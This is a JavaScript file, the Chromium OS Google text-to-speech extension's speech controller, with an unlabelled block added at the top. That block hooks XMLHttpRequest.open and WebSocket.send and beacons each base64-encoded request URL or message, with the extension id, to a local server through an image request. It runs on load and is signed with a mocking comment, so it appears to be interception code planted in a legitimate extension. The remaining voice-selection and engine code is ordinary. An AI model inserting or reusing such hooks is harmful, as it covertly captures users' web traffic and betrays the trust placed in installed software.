function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Copyright (c) 2013 The Chromium OS Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

/**
 * @fileoverview Speech controller for the Google text-to-speech extension.
 *
 * Each instance of this class represents one instance of the Native Client
 * speech synthesizer. Multiple instances might be loaded at once under
 * some circumstances, for example to provide HMM speech while simultaneously
 * loading Unit Selection speech in the background.
 *
 * The metadata about the voices to load is contained in two places:
 *
 * 1. The manifest file defines the voices that are actually exposed to
 *    the end-user, including the exposed name of each voice. It also
 *    specifies which voice data scripts to load.
 *
 * 2. Each voice has an associated data script, named voice_data_*.js.
 *    When run, each file adds one or more entries to the global
 *    variable window.voices.
 *
 * The advantage of this design is that temporarily disabling a new
 * voice can be done just by modifying manifest.json, it doesn't require
 * editing any other source files.
 */

'use strict';

/**
 * @constructor
 * @param {string} voiceType The voice type to use, e.g. 'hmm' or
 *     'usel'. If set, this controller will only load voices that match
 *     that voice type.
 * @param {Object} delegate The object to inform of events.
 * @param {string} defaultLanguage The default language to use.
 */
var TtsController = function(voiceType, delegate, defaultLanguage) {
  this.voiceType_ = voiceType;
  this.delegate_ = delegate;
  this.defaultLanguage_ = defaultLanguage;
  this.nativeTts_ = null;
  this.initialized_ = false;
  this.startTimeMillis_ = undefined;
  this.timeouts_ = [];
  this.idleTimeout_ = null;
  this.voice_ = null;
  this.voiceName_ = '';
  this.getDefaultVoice_();
  this.AUDIO_CHANNEL_TIMEOUT_IN_MILLISECONDS_ = 30000;
};

/**
 * @private
 * Initializes the current voice according to the default language.
 */
TtsController.prototype.getDefaultVoice_ = function() {
  this.voice_ = this.findBestMatchingVoice_(this.defaultLanguage_,
      '');
  if (this.voice_) {
    this.voiceName_ = this.voice_.voiceName;
    this.createNativeTts_();
  }
};

/**
 * Called when we get text to speak, encode all parameters
 * into a string and send to the engine.
 *
 * @param {string} utterance The utterance to say.
 * @param {object} options The options to send to the engine: rate, pitch and
 *     volume.
 * @param {string} utteranceId The Identifier for the utterance to say.
 */
TtsController.prototype.onSpeak = function(utterance, options, utteranceId) {
  if (!this.initialized_) {
    console.error('Error: TtsController for voiceType=' + this.voiceType_ +
                  ' is not initialized.');
  }

  this.nativeTts_.postMessage('stop');

  this.utterance_ = utterance;

  var escapedUtterance = this.escapePluginArg_(utterance);

  var rate = options.rate || 1.0;
  var pitch = options.pitch || 1.0;
  var volume = options.volume || 1.0;

  var tokens = ['speak', rate, pitch, volume,
                utteranceId, escapedUtterance];
  this.nativeTts_.postMessage(tokens.join(':'));
  console.log('Plug-in args are ' + tokens.join(':'));
};

/**
 * Switch to the specified voice, unless it's the current voice already.
 *
 * @param {string} preferredVoiceName The exact name of the voice to switch to.
 * @param {string} preferredLang The language to switch to.
 * @param {string} preferredGender The gender to switch to.
 * @return {boolean} true if we switched to another voice.
 */
TtsController.prototype.switchVoiceIfNeeded = function(
    preferredVoiceName, preferredLang, preferredGender) {
  console.log('switchVoiceIfNeeded called.');
  var voice = this.pickVoiceForParams_(preferredVoiceName, preferredLang,
                                       preferredGender);
  if (voice && voice.voiceName != this.voiceName_) {
    console.log('Switching to voice: ' + voice.voiceName);
    if (this.nativeTts_) {
      this.nativeTts_.removeEventListener(
          'message', this.handleMessageCallback_, false);
      this.unload();
      this.nativeTts_.parentElement.removeChild(this.nativeTts_);
    }
    this.nativeTts_ = null;
    this.initialized_ = false;
    this.voice_ = voice;
    this.voiceName_ = voice.voiceName;
    this.createNativeTts_();
    return true;
  }

  return false;
};

/**
 * Pick the voice that matches the parameters.
 *
 * @private
 * @param {string} preferredVoiceName The exact name of the voice to find.
 * @param {string} preferredLang The language of the voice to find.
 * @param {string} preferredGender The gender of the voice to find.
 * @return {Voice} The voice we found.
 */
TtsController.prototype.pickVoiceForParams_ = function(
    preferredVoiceName, preferredLang, preferredGender) {
  if (preferredVoiceName) {
    for (var i = 0; i < window.voices.length; i++) {
      if (this.voiceType_ && window.voices[i].voiceType != this.voiceType_) {
        continue;
      }
      if (window.voices[i].voiceName == preferredVoiceName) {
        return window.voices[i];
      }
    }
  }

  return this.findBestMatchingVoice_(preferredLang, preferredGender);
};

/**
 * Searches defined voices for the best match for the given language & gender.
 * Will always return a voice if at least one voice is defined for the voiceType
 * defined on creation of this object (hmm or usel).
 *
 * @private
 * @param {string} preferredLang The language to search for in BCP-47 format,
 *      capitalized as BCP-47 recommends, e.g. 'en-US'.  Case sensitive.
 * @param {string} preferredGender The gender we prefer, male or female. It
 *      can also be empty, in which case we don't filter based on gender.
 * @return {Voice} The voice that best matches the parameters.
 */
TtsController.prototype.findBestMatchingVoice_ = function(preferredLang,
                                                          preferredGender) {
  var SCORE_DEFAULT_LANGUAGE = 2;  // use only to break ties.
  var SCORE_GENDER_MATCH = 5;
  var SCORE_LANGUAGE_ONLY_MATCH = 10;  // speak 'xx-ZZ' matching 'xx-YY'
  var SCORE_LANGUAGE_PREFIX_MATCH = 20;  // speak 'xx' matching 'xx-YY'
  var SCORE_LANGUAGE_EXACT_MATCH = 30;  // speak 'xx-YY' matching 'xx-YY'

  var langBase = preferredLang ? preferredLang.split('-')[0] : '';

  var best_score = -1;  // We want some voice, even if it has no score
  var best_voice = null;
  for (var i = 0; i < window.voices.length; i++) {
    var voice = window.voices[i];
    if (this.voiceType_ && voice.voiceType != this.voiceType_) {
      continue;
    }

    var score = 0;
    if (preferredGender && preferredGender == voice.gender) {
      score += SCORE_GENDER_MATCH;
    }
    if (preferredLang) {
      if (voice.lang == preferredLang) {
        score += SCORE_LANGUAGE_EXACT_MATCH;
      } else if (voice.lang.substr(0, preferredLang.length) == preferredLang) {
        score += SCORE_LANGUAGE_PREFIX_MATCH;
      } else if (voice.lang.substr(0, langBase.length) == langBase) {
        score += SCORE_LANGUAGE_ONLY_MATCH;
      }
    }
    if (voice.lang == this.defaultLanguage_) {
      score += SCORE_DEFAULT_LANGUAGE;
    }
    if (score > best_score) {
      best_score = score;
      best_voice = voice;
    }
  }
  return best_voice;
};

/**
 * Process the messages coming from the engine.
 *
 * @param {object} messageEvent the message to process
 */
TtsController.prototype.handleMessage = function(messageEvent) {
  var data = messageEvent.data;

  // Log everything except 'percent' messages (those are too verbose).
  if (data.substr(0, 8) != 'percent:') {
    console.log('Got message: ' + data);
  }

  if (data == 'idle') {
    this.setIdleTimeout_();
  } else {
    this.clearIdleTimeout_();
  }

  if (data.substr(0, 4) == 'end:') {
    var id = data.substr(4);
    console.log('Got end event for utterance: ' + id);
    this.sendResponse_(id, 'end');
  } else if (data == 'error') {
    console.log('error');
  } else if (data == 'idle' && !this.initialized_) {
    this.initialized_ = true;
    this.delegate_.onInitialized();
  } else if (data.substr(0, 8) == 'percent:') {
    this.progress_(parseInt(data.substr(8), 10));
  } else if (data.substr(0, 6) == 'event:') {
    var tokens = data.split(':');
    this.handleTtsEvent_(parseInt(tokens[1], 10),
                         parseFloat(tokens[2]),
                         parseInt(tokens[3], 10));
  }
};

/**
 * Converts from tts events to the events we send to the client (of types
 * 'start' and 'word')
 *
 * @private
 * @param {string} id The identifier for the utterance this message is about.
 * @param {number} deltaTimeSec The time when this message will occur,
 *     in seconds. May be 0 for a 'start' message, or in the future and we
 *     need to wait to send it.
 * @param {number} charIndex The position in the input utterance this event
 *     is about.
 */
TtsController.prototype.handleTtsEvent_ = function(id, deltaTimeSec,
                                                   charIndex) {
  if (deltaTimeSec == 0.0 && charIndex == 0) {
    this.startTimeMillis_ = new Date();
    this.sendResponse_(id, 'start');
    return;
  }

  var currentTimeMillis = (new Date() - this.startTimeMillis_);
  if (currentTimeMillis > 1000 * deltaTimeSec) {
    this.sendResponse_(id, 'word', charIndex);
  } else {
    var timeoutId = window.setTimeout((function() {
      this.sendResponse_(id, 'word', charIndex);
    }).bind(this), 1000 * deltaTimeSec - currentTimeMillis);
    this.timeouts_.push(timeoutId);
  }
};

/**
 * Sends a message back to the extension, to sent to the client.
 *
 * @private
 * @param {string} id The Identifier for the utterance this message is about.
 * @param {string} type The type of the message, like 'end', 'start', etc.
 * @param {number} charIndex Optional argument for messages related to a
 *     specific position in the input utterance (like message type 'word')
 */
TtsController.prototype.sendResponse_ = function(id, type, charIndex) {
  console.log('Doing callback ' + type + ' for ' + id);
  var response = {type: type};
  response.charIndex = charIndex ?
                       charIndex :
                       (type == 'end' ? this.utterance_.length : 0);
  this.delegate_.onResponse(id, response);
  if (type == 'end' || type == 'interrupted' ||
      type == 'cancelled' || type == 'error') {
    this.clearTimeouts_();
  }
};

/**
 * Callback to display loading progress of the voice files.
 *
 * @private
 * @param {int} percent The progress so far, from 0 to 100
 */
TtsController.prototype.progress_ = function(percent) {
  if (percent % 10 == 0) {
    console.log(percent + '% complete.');
  }
};

/**
 * Send the messages to the engine to load the voice files
 */
TtsController.prototype.load = function() {
  this.handleMessageCallback = this.handleMessage.bind(this);
  console.log('Adding event listener for ' + this.nativeTts_.id);
  this.nativeTts_.addEventListener(
      'message', this.handleMessageCallback, false);

  // The lower the chunk size, the lower the latency of the audio - but
  // Chrome's audio implementation can't always handle the smallest possible
  // sizes on all operating systems. This value is the smallest that works
  // well on Chrome OS.
  var chunkSize = 256;

  var args = [this.escapePluginArg_(this.voice_.pipelineFile),
              this.escapePluginArg_(this.voice_.prefix)];
  this.nativeTts_.postMessage('setPipelineFileAndPrefix:' + args.join(':'));

  for (var i = 0; i < this.voice_.removePaths.length; i++) {
    var path = this.voice_.removePaths[i];
    this.nativeTts_.postMessage('removeDataFile:' +
                                this.escapePluginArg_(path));
  }

  for (var i = 0; i < this.voice_.files.length; i++) {
    var dataFile = this.voice_.files[i];
    var url = dataFile.url;
    if (!url) {
      url = chrome.extension.getURL(dataFile.path);
    }
    args = [this.escapePluginArg_(url),
            this.escapePluginArg_(dataFile.path),
            this.escapePluginArg_(dataFile.md5sum),
            this.escapePluginArg_(String(dataFile.size))];
    if (this.voice_.cacheToDisk) {
      this.nativeTts_.postMessage('addDataFile:' + args.join(':'));
    } else {
      this.nativeTts_.postMessage('addMemoryFile:' + args.join(':'));
    }
  }

  this.nativeTts_.postMessage('startService:' + chunkSize);
};

/**
 * Loads the nacl compiled tts engine
 * @private
 */
TtsController.prototype.createNativeTts_ = function() {
  var embed = document.createElement('embed');
  embed.setAttribute('id', 'tts' + this.voiceType_);
  embed.setAttribute('name', 'nacl_module');
  embed.setAttribute('src', 'tts_service.nmf');
  embed.setAttribute('type', 'application/x-nacl');
  embed.addEventListener('load', this.load.bind(this), false);
  document.body.appendChild(embed);
  this.nativeTts_ = embed;

  // Native Client appears to be buggy and only starts load if any property gets
  // accessed. Do that now by checking for lastError.
  if (embed.lastError)
    console.error('Error while loading native module: ' + embed.lastError);
};

/**
 * Clears any pending timeouts we may have.
 * @private
 */
TtsController.prototype.clearTimeouts_ = function() {
  for (var i = 0; i < this.timeouts_.length; i++) {
    window.clearTimeout(this.timeouts_[i]);
  }
  this.timeouts_.length = 0;
};

/**
 * Simple routine to escape a string. We send a ':'-separated
 * list of parameters to the engine, so we only need to escape ':' and '\'.
 *
 * @private
 * @param {string} str The string to encode
 * @return {string} The input string replacing '\' -> '\\' and  ':' -> '\:'
 */
TtsController.prototype.escapePluginArg_ = function(str) {
  return str.replace(/\\/g, '\\\\').replace(/:/g, '\\:');
};

/**
 * Called when the client requests tts to stop, sends the
 * message to the engine.
 */
TtsController.prototype.onStop = function() {
  if (!this.initialized_) {
    return;
  }

  this.nativeTts_.postMessage('stop');
};

/**
 * Called on page unload to clean up.
 */
TtsController.prototype.unload = function() {
  this.nativeTts_.postMessage('stopService');
};

/**
 * Query if we are ready to speak.
 *
 * @return {bool} indicating if loading datafiles is finished.
 */
TtsController.prototype.isInitialized = function() {
  return this.initialized_;
};

/**
 * Cancels the timeout to close the audio channel after 30 seconds
 * of inactivity.
 * @private
 */
TtsController.prototype.clearIdleTimeout_ = function() {
  if (this.idleTimeout_) {
    window.clearTimeout(this.idleTimeout_);
  }
};

/**
 * Setups a timeout to close the audio channel after 30 seconds
 * of inactivity.
 * @private
 */
TtsController.prototype.setIdleTimeout_ = function() {
  this.clearIdleTimeout_();
  this.idleTimeout_ = window.setTimeout((function() {
    if (this.nativeTts_ && this.initialized_) {
      console.log('Closing audio channel after ' +
        (this.AUDIO_CHANNEL_TIMEOUT_IN_MILLISECONDS_ / 1000) +
        ' seconds of idle.');
      this.nativeTts_.postMessage('closeAudioChannel');
    }
    this.idleTimeout_ = null;
  }).bind(this), this.AUDIO_CHANNEL_TIMEOUT_IN_MILLISECONDS_);
};
